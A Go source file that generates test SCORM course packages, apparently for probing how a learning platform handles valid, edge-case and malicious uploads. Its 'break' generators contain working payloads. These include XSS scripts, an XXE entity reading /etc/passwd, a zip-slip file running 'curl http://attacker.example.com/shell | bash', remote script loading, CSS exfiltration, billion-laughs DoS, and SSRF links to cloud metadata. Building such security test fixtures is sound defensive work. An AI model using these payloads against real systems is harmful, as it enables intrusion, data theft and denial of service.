package scorm

import (
	"archive/zip"
	"bytes"
	"fmt"
)

// GeneratorFunc is the signature for all SCORM package builder functions.
type GeneratorFunc func() ([]byte, error)

// generatorRegistry maps type_key → builder function.
// Metadata (name, category, description, etc.) lives in the DB via generator_reg.go.
var generatorRegistry = map[string]GeneratorFunc{
	// ── VALID packages ────────────────────────────────────────────────────
	"valid_scorm12_basic":       genSCORM12Basic,
	"valid_scorm2004_basic":     genSCORM2004Basic,
	"valid_multi_sco":           genMultiSCO,
	"valid_lang_fr":             genLangFR,
	"valid_lang_es":             genLangES,
	"valid_lang_ja":             genLangJA,
	"valid_lang_de":             genLangDE,
	"valid_lang_nl":             genLangNL,
	"valid_lang_pt":             genLangPT,
	"valid_lang_it":             genLangIT,
	"valid_lang_ar":             genLangAR,
	"valid_lang_ur":             genLangUR,
	"valid_subdirectory":        genSubdirectory,
	"valid_pdf_resource":        genPDFResource,
	"valid_external_links":      genExternalLinks,
	// ── EDGE packages ────────────────────────────────────────────────────
	"edge_deeply_nested":        genDeeplyNested,
	"edge_large_html":           genLargeHTML,
	"edge_missing_resources":    genMissingResources,
	"edge_empty_html":           genEmptyHTML,
	"edge_xml_comments":         genXMLComments,
	"edge_windows_paths":        genWindowsPaths,
	// ── BREAK packages ───────────────────────────────────────────────────
	"break_xss_manifest":        genXSSManifest,
	"break_xxe_injection":       genXXEInjection,
	"break_zip_slip":            genZipSlip,
	"break_dom_xss":             genDOMXSS,
	"break_billion_laughs":      genBillionLaughs,
	"break_css_exfil":           genCSSExfiltration,
	"break_overlong_strings":    genOverlongStrings,
	"break_null_byte":           genNullByte,
	"break_path_traversal_ssrf": genPathTraversalSSRF,
	"break_unicode_bidi":        genUnicodeBiDi,
}

// Build generates a SCORM zip package for the given type_key.
func Build(typeKey string) ([]byte, error) {
	fn, ok := generatorRegistry[typeKey]
	if !ok {
		return nil, fmt.Errorf("unknown generator type_key: %q", typeKey)
	}
	return fn()
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func newZip(files map[string]string) ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, content := range files {
		f, err := w.Create(name)
		if err != nil {
			return nil, err
		}
		if _, err := f.Write([]byte(content)); err != nil {
			return nil, err
		}
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func scormHTML(title, body string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>%s</title></head>
<body>%s</body>
</html>`, title, body)
}

func imsManifest12(identifier, title, href string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="%s" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata>
    <schema>ADL SCORM</schema><schemaversion>1.2</schemaversion>
  </metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>%s</title>
      <item identifier="ITEM1" identifierref="RES1"><title>%s</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="%s">
      <file href="%s"/>
    </resource>
  </resources>
</manifest>`, identifier, title, title, href, href)
}

func imsManifest2004(identifier, title, href string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="%s"
  xmlns="http://www.imsglobal.org/xsd/imscp_v1p1"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_v1p3"
  xmlns:adlseq="http://www.adlnet.org/xsd/adlseq_v1p3"
  xmlns:imsss="http://www.imsglobal.org/xsd/imsss">
  <metadata><schema>ADL SCORM</schema><schemaversion>2004 3rd Edition</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>%s</title>
      <item identifier="ITEM1" identifierref="RES1"><title>%s</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormType="sco" href="%s">
      <file href="%s"/>
    </resource>
  </resources>
</manifest>`, identifier, title, title, href, href)
}

// ── VALID generators ──────────────────────────────────────────────────────────

func genSCORM12Basic() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("SCORM12_BASIC", "Basic SCORM 1.2 Course", "index.html"),
		"index.html":      scormHTML("Basic SCORM 1.2", "<h1>Basic SCORM 1.2 Module</h1><p>This is a standard SCORM 1.2 package used for baseline testing.</p>"),
	})
}

func genSCORM2004Basic() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest2004("SCORM2004_BASIC", "Basic SCORM 2004 Course", "index.html"),
		"index.html":      scormHTML("Basic SCORM 2004", "<h1>Basic SCORM 2004 Module</h1><p>Standard SCORM 2004 3rd Edition package.</p>"),
	})
}

func genMultiSCO() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="MULTI_SCO" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>Multi-SCO Course</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module 1 — Introduction</title></item>
      <item identifier="ITEM2" identifierref="RES2"><title>Module 2 — Content</title></item>
      <item identifier="ITEM3" identifierref="RES3"><title>Module 3 — Assessment</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="sco1.html"><file href="sco1.html"/></resource>
    <resource identifier="RES2" type="webcontent" adlcp:scormtype="sco" href="sco2.html"><file href="sco2.html"/></resource>
    <resource identifier="RES3" type="webcontent" adlcp:scormtype="sco" href="sco3.html"><file href="sco3.html"/></resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"sco1.html":       scormHTML("Module 1", "<h1>Introduction</h1><p>Welcome to this multi-SCO course. This is the first learning object.</p>"),
		"sco2.html":       scormHTML("Module 2", "<h1>Main Content</h1><p>This is the primary content section of the course.</p>"),
		"sco3.html":       scormHTML("Module 3", "<h1>Assessment</h1><p>Test your knowledge with this assessment module.</p>"),
	})
}

func langPackage(lang, title, body, scorm string) ([]byte, error) {
	var manifest string
	if scorm == "1.2" {
		manifest = imsManifest12("LANG_"+lang, title, "index.html")
	} else {
		manifest = imsManifest2004("LANG_"+lang, title, "index.html")
	}
	html := fmt.Sprintf(`<!DOCTYPE html>
<html lang="%s"><head><meta charset="UTF-8"><title>%s</title></head>
<body>%s</body></html>`, lang, title, body)
	return newZip(map[string]string{"imsmanifest.xml": manifest, "index.html": html})
}

func genLangFR() ([]byte, error) {
	return langPackage("fr", "Cours en Français", "<h1>Bienvenue</h1><p>Ceci est un module d'apprentissage en langue française.</p>", "1.2")
}
func genLangES() ([]byte, error) {
	return langPackage("es", "Curso en Español", "<h1>Bienvenido</h1><p>Este es un módulo de aprendizaje en español.</p>", "1.2")
}
func genLangJA() ([]byte, error) {
	return langPackage("ja", "日本語コース", "<h1>ようこそ</h1><p>これは日本語の学習モジュールです。</p>", "1.2")
}
func genLangDE() ([]byte, error) {
	return langPackage("de", "Kurs auf Deutsch", "<h1>Willkommen</h1><p>Dies ist ein Lernmodul in deutscher Sprache.</p>", "1.2")
}
func genLangNL() ([]byte, error) {
	return langPackage("nl", "Cursus in het Nederlands", "<h1>Welkom</h1><p>Dit is een leermodule in de Nederlandse taal.</p>", "1.2")
}
func genLangPT() ([]byte, error) {
	return langPackage("pt", "Curso em Português", "<h1>Bem-vindo</h1><p>Este é um módulo de aprendizagem em língua portuguesa.</p>", "1.2")
}
func genLangIT() ([]byte, error) {
	return langPackage("it", "Corso in Italiano", "<h1>Benvenuto</h1><p>Questo è un modulo didattico in lingua italiana.</p>", "1.2")
}
func genLangAR() ([]byte, error) {
	return langPackage("ar", "دورة باللغة العربية", `<h1 dir="rtl">مرحباً</h1><p dir="rtl">هذه وحدة تعليمية باللغة العربية.</p>`, "1.2")
}
func genLangUR() ([]byte, error) {
	return langPackage("ur", "اردو کورس", `<h1 dir="rtl">خوش آمدید</h1><p dir="rtl">یہ اردو زبان میں ایک تعلیمی ماڈیول ہے۔</p>`, "1.2")
}

func genSubdirectory() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("SUBDIR", "Subdirectory Layout", "content/index.html"),
		"content/index.html": scormHTML("Subdirectory Course",
			"<h1>Subdirectory Layout</h1><p>This SCO's HTML file is nested inside a content/ subdirectory.</p>"),
		"assets/style.css": "body { font-family: sans-serif; }",
	})
}

func genPDFResource() ([]byte, error) {
	// Minimal valid PDF header
	pdfContent := "%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\nxref\n0 2\n0000000000 65535 f\ntrailer\n<< /Size 2 /Root 1 0 R >>\nstartxref\n9\n%%EOF"
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("PDF_RESOURCE", "Course with PDF Resource", "index.html"),
		"index.html":      scormHTML("PDF Resource", `<h1>PDF Resource Test</h1><p>This module references a PDF file.</p><a href="resource.pdf">Download PDF</a>`),
		"resource.pdf":    pdfContent,
	})
}

func genExternalLinks() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("EXT_LINKS", "External Links Course", "index.html"),
		"index.html": scormHTML("External Links",
			`<h1>External Links</h1>
<p>This module contains external resource links.</p>
<ul>
  <li><a href="https://www.example.com/resource1">External Resource 1</a></li>
  <li><a href="https://docs.example.org/guide">Documentation</a></li>
  <li><a href="https://cdn.example.net/video.mp4">Video Resource</a></li>
</ul>`),
	})
}

// ── EDGE generators ───────────────────────────────────────────────────────────

func genDeeplyNested() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("DEEP_NESTED", "Deeply Nested", "a/b/c/d/e/f/index.html"),
		"a/b/c/d/e/f/index.html": scormHTML("Deep Nesting",
			"<h1>Deeply Nested</h1><p>This SCO is 6 directories deep to stress path resolution.</p>"),
	})
}

func genLargeHTML() ([]byte, error) {
	// Generate ~2MB of HTML content
	var content bytes.Buffer
	content.WriteString("<h1>Large HTML File</h1>")
	for i := 0; i < 8000; i++ {
		content.WriteString(fmt.Sprintf("<p>Paragraph %d: This is a test paragraph with enough content to push the file size toward 2MB for stress testing the parser.</p>\n", i))
	}
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("LARGE_HTML", "Large HTML File", "index.html"),
		"index.html":      scormHTML("Large HTML", content.String()),
	})
}

func genMissingResources() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="MISSING_RES" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>Missing Resources</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("Missing Resources", "<h1>Missing Resources Tag</h1><p>The manifest intentionally omits the resources element.</p>"),
	})
}

func genEmptyHTML() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("EMPTY_HTML", "Empty HTML Files", "index.html"),
		"index.html":      "",
	})
}

func genXMLComments() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<!-- Scout edge test: XML comments throughout manifest -->
<manifest identifier="XML_COMMENTS" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <!-- Metadata section -->
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <!-- Organizations -->
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>XML Comments Course <!-- inline comment --></title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
  <!-- Resources -->
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="index.html">
      <file href="index.html"/><!-- file reference -->
    </resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("XML Comments", "<h1>XML Comments</h1><p>Manifest contains XML comments in unusual positions.</p>"),
	})
}

func genWindowsPaths() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="WIN_PATHS" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>Windows Paths</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="content\index.html">
      <file href="content\index.html"/>
    </resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml":  manifest,
		"content/index.html": scormHTML("Windows Paths", "<h1>Windows Backslash Paths</h1><p>Manifest uses Windows-style backslash path separators.</p>"),
	})
}

// ── BREAK generators ──────────────────────────────────────────────────────────

func genXSSManifest() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="XSS_MANIFEST" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title><![CDATA[<script>alert('XSS in title')</script>]]></title>
      <item identifier="ITEM1" identifierref="RES1">
        <title><script>alert('XSS in item title')</script></title>
      </item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco"
      href="index.html" data-xss="&lt;script&gt;alert(1)&lt;/script&gt;">
      <file href="index.html"/>
    </resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("XSS Manifest", "<h1>XSS in Manifest</h1><p>Manifest contains XSS payloads in title and attribute fields.</p>"),
	})
}

func genXXEInjection() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE manifest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://attacker.example.com/steal?data=secret">
]>
<manifest identifier="XXE_TEST" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>XXE Test &xxe;</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="index.html">
      <file href="index.html"/>
    </resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("XXE Injection", "<h1>XXE Injection Test</h1><p>Manifest contains XXE entity declarations targeting local files and remote URLs.</p>"),
	})
}

func genZipSlip() ([]byte, error) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	// Path traversal filenames — a secure extractor should reject these
	files := map[string]string{
		"../../etc/passwd":                    "root:x:0:0:root:/root:/bin/bash",
		"../../../tmp/evil.sh":                "#!/bin/bash\ncurl http://attacker.example.com/shell | bash",
		"imsmanifest.xml":                     imsManifest12("ZIP_SLIP", "ZIP Slip Traversal", "index.html"),
		"index.html":                          scormHTML("ZIP Slip", "<h1>ZIP Slip Attack</h1><p>Contains path traversal filenames designed to escape the extraction directory.</p>"),
	}
	for name, content := range files {
		f, err := w.Create(name)
		if err != nil {
			return nil, err
		}
		if _, err := f.Write([]byte(content)); err != nil {
			return nil, err
		}
	}
	w.Close()
	return buf.Bytes(), nil
}

func genDOMXSS() ([]byte, error) {
	html := `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>DOM XSS Test</title></head>
<body>
<h1>DOM XSS Vectors</h1>
<div id="content"></div>
<script>
// Various DOM XSS attack vectors
document.getElementById('content').innerHTML = location.hash.slice(1);
eval(location.search.slice(1));
document.write('<img src=x onerror=alert(1)>');
setTimeout('alert("XSS via setTimeout")', 100);
var s = document.createElement('script');
s.src = '//attacker.example.com/evil.js';
document.head.appendChild(s);
</script>
</body>
</html>`
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("DOM_XSS", "DOM XSS Vectors", "index.html"),
		"index.html":      html,
	})
}

func genBillionLaughs() ([]byte, error) {
	manifest := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE manifest [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<manifest identifier="BILLION_LAUGHS" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>Billion Laughs DoS &lol6;</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="index.html">
      <file href="index.html"/>
    </resource>
  </resources>
</manifest>`
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("Billion Laughs", "<h1>XML Billion Laughs DoS</h1><p>Manifest uses recursive XML entity expansion to cause DoS.</p>"),
	})
}

func genCSSExfiltration() ([]byte, error) {
	html := `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><title>CSS Exfiltration</title>
<style>
/* CSS attribute selector exfiltration attack */
input[value^="a"] { background: url('https://attacker.example.com/leak?v=a'); }
input[value^="b"] { background: url('https://attacker.example.com/leak?v=b'); }
input[value*="secret"] { background: url('https://attacker.example.com/leak?found=secret'); }
@import url('https://attacker.example.com/evil.css');
</style>
</head>
<body>
<h1>CSS Exfiltration Attack</h1>
<input type="text" value="secret-token-abc123">
</body>
</html>`
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("CSS_EXFIL", "CSS Exfiltration", "index.html"),
		"index.html":      html,
	})
}

func genOverlongStrings() ([]byte, error) {
	// Generate a 100KB string to test buffer overflow handling
	var longTitle bytes.Buffer
	for i := 0; i < 5000; i++ {
		longTitle.WriteString("AAAAAAAAAAAAAAAAAAAAAA")
	}
	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<manifest identifier="OVERLONG" version="1.2"
  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
  <organizations default="ORG1">
    <organization identifier="ORG1">
      <title>%s</title>
      <item identifier="ITEM1" identifierref="RES1"><title>Module</title></item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="RES1" type="webcontent" adlcp:scormtype="sco" href="index.html">
      <file href="index.html"/>
    </resource>
  </resources>
</manifest>`, longTitle.String())
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("Overlong Strings", "<h1>Overlong Strings</h1><p>Manifest title contains a 100KB+ string to test buffer handling.</p>"),
	})
}

func genNullByte() ([]byte, error) {
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("NULL_BYTE", "Null Byte Test", "index.html\x00.html"),
		"index.html":      scormHTML("Null Byte", "<h1>Null Byte Injection</h1><p>Filename in manifest contains a null byte to test parser handling.</p>"),
	})
}

func genPathTraversalSSRF() ([]byte, error) {
	html := `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Path Traversal + SSRF</title></head>
<body>
<h1>Path Traversal and SSRF Links</h1>
<ul>
  <li><a href="file:///etc/passwd">Local file read attempt</a></li>
  <li><a href="http://169.254.169.254/latest/meta-data/">AWS metadata SSRF</a></li>
  <li><a href="http://localhost:5432/">Internal DB SSRF</a></li>
  <li><a href="../../../etc/shadow">Path traversal</a></li>
  <li><a href="gopher://internal-service:6379/_FLUSHALL">Gopher protocol</a></li>
</ul>
</body>
</html>`
	return newZip(map[string]string{
		"imsmanifest.xml": imsManifest12("PATH_SSRF", "Path Traversal SSRF", "index.html"),
		"index.html":      html,
	})
}

func genUnicodeBiDi() ([]byte, error) {
	// BiDi override and homograph attacks
	manifest := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
		"<manifest identifier=\"UNICODE_BIDI\" version=\"1.2\"\n" +
		"  xmlns=\"http://www.imsproject.org/xsd/imscp_rootv1p1p2\"\n" +
		"  xmlns:adlcp=\"http://www.adlnet.org/xsd/adlcp_rootv1p2\">\n" +
		"  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>\n" +
		"  <organizations default=\"ORG1\">\n" +
		"    <organization identifier=\"ORG1\">\n" +
		"      <title>\u202E\u0041\u0042\u0043 Reversed BiDi Title</title>\n" +
		"      <item identifier=\"ITEM1\" identifierref=\"RES1\"><title>pаypal.com (homograph)</title></item>\n" +
		"    </organization>\n" +
		"  </organizations>\n" +
		"  <resources>\n" +
		"    <resource identifier=\"RES1\" type=\"webcontent\" adlcp:scormtype=\"sco\" href=\"index.html\">\n" +
		"      <file href=\"index.html\"/>\n" +
		"    </resource>\n" +
		"  </resources>\n" +
		"</manifest>"
	return newZip(map[string]string{
		"imsmanifest.xml": manifest,
		"index.html":      scormHTML("Unicode BiDi", "<h1>Unicode BiDi Override + Homograph</h1><p>Contains Unicode right-to-left override characters and Cyrillic homograph attacks.</p>"),
	})
}
